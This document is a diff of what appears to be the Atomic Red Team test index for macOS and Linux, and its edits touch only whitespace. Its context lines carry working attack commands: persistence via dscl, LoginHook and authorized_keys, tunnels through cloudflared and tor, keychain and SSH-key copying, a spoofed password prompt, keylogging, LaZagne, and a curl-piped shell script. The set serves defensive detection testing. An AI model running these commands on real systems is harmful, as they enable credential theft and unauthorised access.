           kill `pgrep firefox`
@@ -32234,7 +32234,7 @@ persistence:
       auto_generated_guid: '01993ba5-1da3-4e15-a719-b690d4f0f0b2'
       description: 'Creates a user on a MacOS system with dscl
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -32256,7 +32256,7 @@ persistence:
           dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}
         cleanup_command: 'dscl . -delete /Users/#{username}
 
-          '
+'
         name: bash
         elevation_required: true
   T1176.002:
@@ -32513,10 +32513,10 @@ persistence:
           ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys;
           fi;
 
-          '
+'
         cleanup_command: 'unset ssh_authorized_keys
 
-          '
+'
   T1546.012:
     technique:
       type: attack-pattern
@@ -33212,10 +33212,10 @@ persistence:
       executor:
         command: 'osascript #{scriptfile}
 
-          '
+'
         cleanup_command: 'osascript #{cleanup_script}
 
-          '
+'
         name: bash
   T1205.001:
     technique:
@@ -33757,7 +33757,7 @@ persistence:
       description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
         daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -34196,7 +34196,7 @@ persistence:
       description: 'This test uses the kextload and kmutil commands to load and unload
         a MacOS kernel module.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -34208,13 +34208,13 @@ persistence:
       dependencies:
       - description: 'The kernel module must exist on disk at specified location
 
-          '
+'
         prereq_command: 'if [ -d #{module_path} ] ; then exit 0; else exit 1 ; fi
 
-          '
+'
         get_prereq_command: 'exit 1
 
-          '
+'
       executor:
         command: |
           set -x
@@ -34246,14 +34246,14 @@ persistence:
       dependencies:
       - description: 'The kernel module must exist on disk at specified location
 
-          '
+'
         prereq_command: 'if [ -f "#{exe_path}" ]; then exit 0 ; else exit 1; fi
 
-          '
+'
         get_prereq_command: 'cc -o #{exe_path} #{src_path} -framework IOKit -framework
           Foundation
 
-          '
+'
       executor:
         command: |
           sudo #{exe_path}
@@ -34263,7 +34263,7 @@ persistence:
         elevation_required: true
         cleanup_command: 'rm -f #{exe_path}
 
-          '
+'
   T1574.013:
     technique:
       type: attack-pattern
@@ -35049,7 +35049,7 @@ persistence:
       auto_generated_guid: 94500ae1-7e31-47e3-886b-c328da46872f
       description: 'Adds a command to the .bash_profile file of the current user
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -35061,7 +35061,7 @@ persistence:
       executor:
         command: 'echo ''#{command_to_add}'' >> ~/.bash_profile
 
-          '
+'
         cleanup_command: |
           head -n '-2' ~/.bash_profile > /tmp/T1546.004
           mv /tmp/T1546.004 ~/.bash_profile
@@ -35070,7 +35070,7 @@ persistence:
       auto_generated_guid: 0a898315-4cfa-4007-bafe-33a4646d115f
       description: 'Adds a command to the .bashrc file of the current user
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -35082,7 +35082,7 @@ persistence:
       executor:
         command: 'echo ''#{command_to_add}'' >> ~/.bashrc
 
-          '
+'
         cleanup_command: |
           head -n '-2' ~/.bashrc > /tmp/T1546.004
           mv /tmp/T1546.004 ~/.bashrc
@@ -35388,10 +35388,10 @@ persistence:
       executor:
         command: 'sudo touch /Library/StartupItems/EvilStartup.plist
 
-          '
+'
         cleanup_command: 'sudo rm /Library/StartupItems/EvilStartup.plist
 
-          '
+'
         name: sh
         elevation_required: true
     - name: Add launch script to launch daemon
@@ -35420,34 +35420,34 @@ persistence:
         prereq_command: 'if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems;
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'echo "Failed to create /Library/StartupItems"; exit 1;
 
-          '
+'
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       - description: 'The startup script must exist on disk at specified location
           (#{path_malicious_script})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_script} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The startup script doesn''t exist. Check the path
           and try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -35488,34 +35488,34 @@ persistence:
         prereq_command: 'if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems;
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'echo "Failed to create /Library/StartupItems"; exit 1;
 
-          '
+'
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       - description: 'The startup script must exist on disk at specified location
           (#{path_malicious_script})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_script} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The startup script doesn''t exist. Check the path
           and try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -35753,7 +35753,7 @@ persistence:
       description: 'Creates a Python startup hook using a .pth file inside a virtual
         environment on macOS.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -35777,7 +35777,7 @@ persistence:
           (''brew install python'' or ''brew install python3 or brew install python@3.X'')
           or the macOS developer tools (''xcode-select --install'')."
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -35811,7 +35811,7 @@ persistence:
       - description: 'Python must be installed and the specified binary (#{python_exe})
           must be in the PATH.
 
-          '
+'
         prereq_command: |
           PYTHON_CMD=$(command -v #{python_exe} || command -v python)
           if [ -z "$PYTHON_CMD" ]; then exit 1; fi
@@ -35823,7 +35823,7 @@ persistence:
           brew install python3 or brew install python@3.x or the macOS developer tools
           (''xcode-select --install''))."
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
@@ -36258,7 +36258,7 @@ persistence:
       auto_generated_guid: a5983dee-bf6c-4eaf-951c-dbc1a7b90900
       description: 'Create a plist and execute it
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -36275,15 +36275,15 @@ persistence:
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The shared library doesn''t exist. Check the path";
           exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -36326,7 +36326,7 @@ persistence:
       auto_generated_guid: 66774fa8-c562-4bae-a58d-5264a0dd9dd7
       description: 'Create a plist and execute it
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -36344,22 +36344,22 @@ persistence:
         prereq_command: 'if [ ! -d /Library/LaunchAgents ]; then mkdir /Library/LaunchAgents;
           exit 0; fi;
 
-          '
+'
         get_prereq_command: 'echo "Failed to create /Library/LaunchAgents"; exit 1;
 
-          '
+'
       - description: 'The shared library must exist on disk at specified location
           (#{path_malicious_plist})
 
-          '
+'
         prereq_command: 'if [ -f #{path_malicious_plist} ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: 'echo "The plist file doesn''t exist. Check the path and
           try again."; exit 1;
 
-          '
+'
       executor:
         name: bash
         elevation_required: true
@@ -36697,7 +36697,7 @@ persistence:
         command: 'sudo echo osascript -e ''tell app "Finder" to display dialog "Hello
           World"'' >> /etc/rc.common
 
-          '
+'
         elevation_required: true
         name: bash
   T1543.002:
@@ -37041,7 +37041,7 @@ persistence:
       auto_generated_guid: 5fefd767-ef54-4ac6-84d3-751ab85e8aba
       description: 'Copy in new loginwindow.plist to launch Calculator.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -37052,10 +37052,10 @@ persistence:
       executor:
         command: 'cp #{calc_plist_path} ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
 
-          '
+'
         cleanup_command: 'rm -f ~/Library/Preferences/ByHost/com.apple.loginwindow.plist
 
-          '
+'
         name: sh
     - name: Re-Opened Applications using LoginHook
       auto_generated_guid: 5f5b71da-e03f-42e7-ac98-d63f9e0465cb
@@ -37073,10 +37073,10 @@ persistence:
       executor:
         command: 'sudo defaults write com.apple.loginwindow LoginHook #{script}
 
-          '
+'
         cleanup_command: 'sudo defaults delete com.apple.loginwindow LoginHook
 
-          '
+'
         elevation_required: true
         name: sh
     - name: Append to existing loginwindow for Re-Opened Applications
@@ -37100,13 +37100,13 @@ persistence:
       dependencies:
       - description: 'compile C program
 
-          '
+'
         prereq_command: 'if [ -f "#{exe_path}" ]; then exit 0 ; else exit 1; fi
 
-          '
+'
         get_prereq_command: 'cc #{objc_source_path} -o #{exe_path} -framework Cocoa
 
-          '
+'
       executor:
         command: |
           FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`
@@ -38351,7 +38351,7 @@ command-and-control:
       auto_generated_guid: 1164f70f-9a88-4dff-b9ff-dc70e7bf0c25
       description: 'Utilizing a common technique for posting base64 encoded data.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -39031,25 +39031,25 @@ command-and-control:
       dependencies:
       - description: 'Download devtunnel
 
-          '
+'
         prereq_command: 'test -f #{binary_path}
 
-          '
+'
         get_prereq_command: |
           mkdir -p $(dirname #{binary_path})
           curl -L "#{download_url}" -o "#{binary_path}"
           chmod +x #{binary_path}
       - description: 'Login to Microsoft Dev tunnels
 
-          '
+'
         prereq_command: '#{binary_path} user show | grep -q "Not logged in" && exit
           1 || exit 0
 
-          '
+'
         get_prereq_command: 'echo "Login to devtunnel using the following command:
           #{binary_path} user login"
 
-          '
+'
       executor:
         command: "#{binary_path} host -p #{port} &\n"
         cleanup_command: |
@@ -39088,10 +39088,10 @@ command-and-control:
       dependencies:
       - description: 'Install code-cli
 
-          '
+'
         prereq_command: 'which code
 
-          '
+'
         get_prereq_command: "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\"
           && echo \"arm64\" || echo \"x64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen
           brew install code-cli\nelif [ \"$(expr substr $(uname) 1 5)\" = \"Linux\"
@@ -39102,20 +39102,20 @@ command-and-control:
           \ rm \"#{payload_path}/code.${PKG_TYPE}\"\nfi\n"
       - description: 'Login to VSCode Dev tunnels
 
-          '
+'
         prereq_command: 'code tunnel user show | grep -q "not logged in" && exit 1
           || exit 0
 
-          '
+'
         get_prereq_command: 'echo "Login to code tunnel using the following command:
           code tunnel user login"
 
-          '
+'
       executor:
         command: 'nohup code tunnel --accept-server-license-terms #{additional_args}
           >/dev/null 2>&1 &
 
-          '
+'
         cleanup_command: |
           pkill -9 tunnel
           code tunnel unregister
@@ -39152,10 +39152,10 @@ command-and-control:
       dependencies:
       - description: 'Download cloudflared
 
-          '
+'
         prereq_command: 'test -f "#{binary_path}" && exit 0 || exit 1
 
-          '
+'
         get_prereq_command: "ARCH_SUFFIX=$(uname -m | grep -q \"arm64\\|aarch64\"
           && echo \"arm64\" || echo \"amd64\")\nif [ \"$(uname)\" = \"Darwin\" ]\nthen
           curl -L \"#{cloudflared_artifact_base_url}/cloudflared-darwin-${ARCH_SUFFIX}.tgz\"
@@ -39169,7 +39169,7 @@ command-and-control:
         command: 'nohup #{binary_path} tunnel --url #{url_to_tunnel} #{additional_args}
           >/dev/null 2>&1 &
 
-          '
+'
         cleanup_command: |
           pkill -9 $(basename "#{binary_path}")
           rm -f "#{binary_path}"
@@ -39846,17 +39846,17 @@ command-and-control:
         prereq_command: 'if [ -x "$(command -v tor --version)" ]; then exit 0; else
           exit 1; fi
 
-          '
+'
         get_prereq_command: |
           if [ ! -x "$(command -v brew --version)" ]; then /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh keystroke return)"; fi
           brew install tor
       executor:
         command: 'osascript -e ''tell application "Terminal" to do script "tor"''
 
-          '
+'
         cleanup_command: 'killall tor > /dev/null 2>&1
 
-          '
+'
         name: sh
   T1219.003:
     technique:
@@ -40022,7 +40022,7 @@ command-and-control:
       auto_generated_guid: 5db21e1d-dd9c-4a50-b885-b1e748912767
       description: 'Testing uncommonly used port utilizing telnet.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40039,13 +40039,13 @@ command-and-control:
       dependencies:
       - description: 'Requires telnet
 
-          '
+'
         prereq_command: 'which telnet
 
-          '
+'
         get_prereq_command: 'echo "please install telnet to run this test"; exit 1
 
-          '
+'
       executor:
         command: |
           echo quit | telnet #{domain} #{port}
@@ -40736,7 +40736,7 @@ command-and-control:
       auto_generated_guid: 0fc6e977-cb12-44f6-b263-2824ba917409
       description: 'Utilize rsync to perform a remote file copy (push)
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40763,19 +40763,19 @@ command-and-control:
         prereq_command: 'if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1;
           fi
 
-          '
+'
         get_prereq_command: "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
       executor:
         command: 'rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
-          '
+'
         name: sh
         elevation_required: true
     - name: rsync remote file copy (pull)
       auto_generated_guid: 3180f7d5-52c0-4493-9ea0-e3431a84773f
       description: 'Utilize rsync to perform a remote file copy (pull)
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40802,18 +40802,18 @@ command-and-control:
         prereq_command: 'if [ -x "$(command -v rsync)" ]; then exit 0; else exit 1;
           fi
 
-          '
+'
         get_prereq_command: "(pkg install -y rsync)||(sudo apt-get -y install rsync)\n"
       executor:
         command: 'rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
-          '
+'
         name: sh
     - name: scp remote file copy (push)
       auto_generated_guid: 83a49600-222b-4866-80a0-37736ad29344
       description: 'Utilize scp to perform a remote file copy (push)
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40837,13 +40837,13 @@ command-and-control:
       executor:
         command: 'scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
-          '
+'
         name: sh
     - name: scp remote file copy (pull)
       auto_generated_guid: b9d22b9a-9778-4426-abf0-568ea64e9c33
       description: 'Utilize scp to perform a remote file copy (pull)
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40867,13 +40867,13 @@ command-and-control:
       executor:
         command: 'scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-          '
+'
         name: sh
     - name: sftp remote file copy (push)
       auto_generated_guid: f564c297-7978-4aa9-b37a-d90477feea4e
       description: 'Utilize sftp to perform a remote file copy (push)
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40897,13 +40897,13 @@ command-and-control:
       executor:
         command: 'sftp #{username}@#{remote_host}:#{remote_path} <<< $''put #{local_file}''
 
-          '
+'
         name: bash
     - name: sftp remote file copy (pull)
       auto_generated_guid: '0139dba1-f391-405e-a4f5-f3989f2c88ef'
       description: 'Utilize sftp to perform a remote file copy (pull)
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40927,13 +40927,13 @@ command-and-control:
       executor:
         command: 'sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-          '
+'
         name: sh
     - name: whois file download
       auto_generated_guid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
       description: 'Download a remote file using the whois utility
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -40961,23 +40961,23 @@ command-and-control:
       dependencies:
       - description: 'The whois and timeout commands must be present
 
-          '
+'
         prereq_command: 'which whois && which timeout
 
-          '
+'
         get_prereq_command: 'echo "Please install timeout and the whois package"
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
         command: 'timeout --preserve-status #{timeout} whois -h #{remote_host} -p
           #{remote_port} "#{query}" > #{output_file}
 
-          '
+'
         cleanup_command: 'rm -f #{output_file}
 
-          '
+'
     - name: File download via nscurl
       auto_generated_guid: 5bcefe5f-3f30-4f1c-a61a-8d7db3f4450c
       description: |
@@ -41462,7 +41462,7 @@ collection:
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard zip compression.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -41479,11 +41479,11 @@ collection:
       dependencies:
       - description: 'Files to zip must exist (#{input_files})
 
-          '
+'
         prereq_command: 'if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip)
           ] ; then exit 0; else exit 1; fi;
 
-          '
+'
         get_prereq_command: |
           (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
           echo Please set input_files argument to include files that exist
@@ -41492,16 +41492,16 @@ collection:
         elevation_required: true
         command: 'zip #{output_file} #{input_files}
 
-          '
+'
         cleanup_command: 'rm -f #{output_file}
 
-          '
+'
     - name: Data Compressed - nix - gzip Single File
       auto_generated_guid: cde3c2af-3485-49eb-9c1f-0ed60e9cc0af
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -41521,16 +41521,16 @@ collection:
         command: 'test -e #{input_file} && gzip -k #{input_file} || (echo ''#{input_content}''
           >> #{input_file}; gzip -k #{input_file})
 
-          '
+'
         cleanup_command: 'rm -f #{input_file}.gz
 
-          '
+'
     - name: Data Compressed - nix - tar Folder or File
       auto_generated_guid: 7af2b51e-ad1c-498c-aca8-d3290c19535a
       description: 'An adversary may compress data (e.g., sensitive documents) that
         is collected prior to exfiltration. This test uses standard gzip compression.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -41546,27 +41546,27 @@ collection:
       dependencies:
       - description: 'Folder to zip must exist (#{input_file_folder})
 
-          '
+'
         prereq_command: 'test -e #{input_file_folder}
 
-          '
+'
         get_prereq_command: 'mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1
 
-          '
+'
       executor:
         name: sh
         elevation_required: false
         command: 'tar -cvzf #{output_file} #{input_file_folder}
 
-          '
+'
         cleanup_command: 'rm -f #{output_file}
 
-          '
+'
     - name: Data Encrypted with zip and gpg symmetric
       auto_generated_guid: '0286eb44-e7ce-41a0-b109-3da516e05a5f'
       description: 'Encrypt data for exiltration
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -41589,7 +41589,7 @@ collection:
         prereq_command: 'if [ ! -x "$(command -v gpg)" ] || [ ! -x "$(command -v zip)"
           ]; then exit 1; fi;
 
-          '
+'
         get_prereq_command: "(which pkg && pkg install -y gnupg zip)||(which yum &&
           yum -y install epel-release zip gpg)||(which apt-get && apt-get install
           -y zip gpg)\n"
@@ -41604,7 +41604,7 @@ collection:
           ls -l #{test_folder}
         cleanup_command: 'rm -Rf #{test_folder}
 
-          '
+'
     - name: Encrypts collected data with AES-256 and Base64
       auto_generated_guid: a743e3a6-e8b2-4a30-abe7-ca85d201b5d3
       description: "An adversary may compress all the collected data, encrypt and
@@ -41675,7 +41675,7 @@ collection:
         or <code>screencapture</code>.(Citation: CopyFromScreen .NET)(Citation: Antiquated
         Mac Malware)
 
-        '
+'
       kill_chain_phases:
       - kill_chain_name: mitre-attack
         phase_name: collection
@@ -41697,7 +41697,7 @@ collection:
       auto_generated_guid: 0f47ceb1-720f-4275-96b8-21f0562217ac
       description: 'Use screencapture command to collect a full desktop screenshot
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -41708,16 +41708,16 @@ collection:
       executor:
         command: 'screencapture #{output_file}
 
-          '
+'
         cleanup_command: 'rm #{output_file}
 
-          '
+'
         name: bash
     - name: Screencapture (silent)
       auto_generated_guid: deb7d358-5fbd-4dc4-aecc-ee0054d2d9a4
       description: 'Use screencapture command to collect a full desktop screenshot
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -41728,10 +41728,10 @@ collection:
       executor:
         command: 'screencapture -x #{output_file}
 
-          '
+'
         cleanup_command: 'rm #{output_file}
 
-          '
+'
         name: bash
   T1557:
     technique:
@@ -41905,21 +41905,21 @@ collection:
       - description: 'swift script must exist at #{swift_src}, and the terminal must
           have input monitoring permissions.
 
-          '
+'
         prereq_command: 'if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else
           exit 1; fi
 
-          '
+'
         get_prereq_command: 'echo ""
 
-          '
+'
       executor:
         command: 'swift #{swift_src} -keylog
 
-          '
+'
         cleanup_command: 'kill `pgrep swift-frontend`
 
-          '
+'
         name: bash
         elevation_required: false
   T1602:
@@ -42087,7 +42087,7 @@ collection:
       executor:
         command: 'sh #{filename} #{audiofile} #{duration}
 
-          '
+'
         cleanup_command: |
           if test -w #{audiofile}; then
             rm #{audiofile}
@@ -42283,7 +42283,7 @@ collection:
       description: 'Utilize curl to download discovery.sh and execute a basic information
         gathering shell script
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -42296,23 +42296,23 @@ collection:
       dependencies:
       - description: 'Check if curl is installed on the machine.
 
-          '
+'
         prereq_command: 'if [ -x "$(command -v curl)" ]; then echo "curl is installed";
           else echo "curl is NOT installed"; exit 1; fi
 
-          '
+'
         get_prereq_command: 'which apt && apt update && apt install -y curl || which
           pkg && pkg update && pkg install -y curl
 
-          '
+'
       executor:
         command: 'curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh
           | sh -s > #{output_file}
 
-          '
+'
         cleanup_command: 'rm #{output_file}
 
-          '
+'
         name: sh
   T1114.001:
     technique:
@@ -42738,7 +42738,7 @@ collection:
       description: 'This command will copy Apple Notes database files using AppleScript
         as seen in Atomic Stealer.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -43581,7 +43581,7 @@ collection:
           to apply changes." & return & return  default answer "" with icon 1 with
           hidden answer with title "Software Update"''
 
-          '
+'
         name: bash
     - name: AppleScript - Spoofing a credential prompt using osascript
       auto_generated_guid: b7037b89-947a-427a-ba29-e7e9f09bc045
@@ -44328,11 +44328,11 @@ lateral-movement:
         command: 'sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart
           -activate -configure -allowAccessFor -allUsers -privs -all -quiet
 
-          '
+'
         cleanup_command: 'sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart
           -deactivate -stop -configure -privs -none -quiet
 
-          '
+'
         elevation_required: true
   T1080:
     technique:
@@ -45957,21 +45957,21 @@ credential-access:
       - description: 'swift script must exist at #{swift_src}, and the terminal must
           have input monitoring permissions.
 
-          '
+'
         prereq_command: 'if [ -f #{swift_src} ]; then chmod +x #{swift_src}; else
           exit 1; fi
 
-          '
+'
         get_prereq_command: 'echo ""
 
-          '
+'
       executor:
         command: 'swift #{swift_src} -keylog
 
-          '
+'
         cleanup_command: 'kill `pgrep swift-frontend`
 
-          '
+'
         name: bash
         elevation_required: false
   T1110.001:
@@ -46251,7 +46251,7 @@ credential-access:
       description: 'This command will copy Safari BinaryCookies files using AppleScript
         as seen in Atomic Stealer.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -46571,7 +46571,7 @@ credential-access:
       description: 'This command finds all certificate items and sends the output
         to local file in pem format.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -46582,7 +46582,7 @@ credential-access:
       executor:
         command: 'security find-certificate -a -p > #{cert_export}
 
-          '
+'
         cleanup_command: 'rm #{cert_export}'
         name: sh
         elevation_required: false
@@ -46590,7 +46590,7 @@ credential-access:
       auto_generated_guid: e544bbcb-c4e0-4bd0-b614-b92131635f59
       description: 'This command will import a certificate pem file into a keychain.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -46601,7 +46601,7 @@ credential-access:
       executor:
         command: 'security import #{cert_export} -k
 
-          '
+'
         name: sh
         elevation_required: false
     - name: Copy Keychain using cat utility
@@ -46609,7 +46609,7 @@ credential-access:
       description: 'This command will copy the keychain using the cat utility in a
         manner similar to Atomic Stealer.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -46620,7 +46620,7 @@ credential-access:
       executor:
         command: 'cat ~/Library/Keychains/login.keychain-db > #{keychain_export}
 
-          '
+'
         cleanup_command: 'rm #{keychain_export}'
         name: sh
         elevation_required: false
@@ -46967,11 +46967,11 @@ credential-access:
       dependencies:
       - description: 'Check if at least one of tcpdump or tshark is installed.
 
-          '
+'
         prereq_command: 'if [ ! -x "$(command -v tcpdump)" ] && [ ! -x "$(command
           -v tshark)" ]; then exit 1; else exit 0; fi;
 
-          '
+'
         get_prereq_command: "(which yum && yum -y install epel-release tcpdump tshark)||(which
           apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y tcpdump tshark)\n"
       executor:
@@ -46984,7 +46984,7 @@ credential-access:
       description: 'Opens a /dev/bpf file (O_RDONLY) and captures packets for a few
         seconds.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -47004,20 +47004,20 @@ credential-access:
       dependencies:
       - description: 'compile C program
 
-          '
+'
         prereq_command: 'exit 1
 
-          '
+'
         get_prereq_command: 'cc #{csource_path} -o #{program_path}
 
-          '
+'
       executor:
         command: 'sudo #{program_path} -i #{ifname} -t 3
 
-          '
+'
         cleanup_command: 'rm -f #{program_path}
 
-          '
+'
         name: bash
         elevation_required: true
     - name: Filtered Packet Capture macOS using /dev/bpfN with sudo
@@ -47025,7 +47025,7 @@ credential-access:
       description: 'Opens a /dev/bpf file (O_RDONLY), sets BPF filter for ''udp''
         and captures packets for a few seconds.
 
-        '
+'
       supported_platforms:
       - macos
       input_arguments:
@@ -47045,20 +47045,20 @@ credential-access:
       dependencies:
       - description: 'compile C program
 
-          '
+'
         prereq_command: 'exit 1
 
-          '
+'
         get_prereq_command: 'cc #{csource_path} -o #{program_path}
 
-          '
+'
       executor:
         command: 'sudo #{program_path} -f -i #{ifname} -t 3
 
-          '
+'
         cleanup_command: 'rm -f #{program_path}
 
-          '
+'
         name: bash
         elevation_required: true
   T1552.002:
@@ -47522,7 +47522,7 @@ credential-access:
         Stratus Red Team is a self-contained binary. You can use it to easily detonate
         offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -47540,11 +47540,11 @@ credential-access:
       dependencies:
       - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)
 
-          '
+'
         prereq_command: 'if [ -f #{stratus_path}/stratus ]; then exit 0; else exit
           1; fi;
 
-          '
+'
         get_prereq_command: "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
           -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
           | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget
@@ -47557,14 +47557,14 @@ credential-access:
           -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
       - description: 'Check if ~/.aws/credentials file has a default stanza is configured
 
-          '
+'
         prereq_command: 'cat ~/.aws/credentials | grep "default"
 
-          '
+'
         get_prereq_command: 'echo Please install the aws-cli and configure your AWS
           defult profile using: aws configure
 
-          '
+'
       executor:
         command: "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting
           warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho
@@ -48052,7 +48052,7 @@ credential-access:
       auto_generated_guid: 46959285-906d-40fa-9437-5a439accd878
       description: 'Discover private SSH keys on a FreeBSD, macOS or Linux system.
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -48071,14 +48071,14 @@ credential-access:
           exit 0
         cleanup_command: 'rm #{output_file}
 
-          '
+'
         name: sh
     - name: Copy Private SSH Keys with rsync
       auto_generated_guid: 864bb0b2-6bb5-489a-b43b-a77b3a16d68a
       description: 'Copy private SSH keys on a Linux or macOS system to a staging
         folder using the `rsync` command.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -48098,14 +48098,14 @@ credential-access:
           exit 0
         cleanup_command: 'rm -rf #{output_folder}
 
-          '
+'
         name: sh
     - name: Copy the users GnuPG directory with rsync
       auto_generated_guid: 2a5a0601-f5fb-4e2e-aa09-73282ae6afca
       description: 'Copy the users GnuPG (.gnupg) directory on a Mac or Linux system
         to a staging folder using the `rsync` command.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -48125,7 +48125,7 @@ credential-access:
           exit 0
         cleanup_command: 'rm -rf #{output_folder}
 
-          '
+'
         name: sh
   T1557.001:
     technique:
@@ -48728,7 +48728,7 @@ credential-access:
       description: 'Search through bash history for specifice commands we want to
         capture
 
-        '
+'
       supported_platforms:
       - linux
       - macos
@@ -48750,7 +48750,7 @@ credential-access:
         command: 'cat #{bash_history_filename} | grep #{bash_history_grep_args} >
           #{output_file}
 
-          '
+'
         name: sh
   T1552.001:
     technique:
@@ -48824,7 +48824,7 @@ credential-access:
       description: 'Find local AWS credentials from file, defaults to using / as the
         look path.
 
-        '
+'
       supported_platforms:
       - macos
       - linux
@@ -48836,7 +48836,7 @@ credential-access:
       executor:
         command: 'find #{file_path}/.aws -name "credentials" -type f 2>/dev/null
 
-          '
+'
         name: sh
     - name: Extract Browser and System credentials with LaZagne
       auto_generated_guid: 9e507bb8-1d30-4e3b-a49b-cb5727d7ea79
@@ -48846,14 +48846,14 @@ credential-access:
       executor:
         command: 'python2 laZagne.py all
 
-          '
+'
         elevation_required: true
         name: bash
     - name: Extract passwords with grep
       auto_generated_guid: bd4cf0d1-7646-474e-8610-78ccf5a097c4
       description: 'Extracting credentials from files
 
-        '
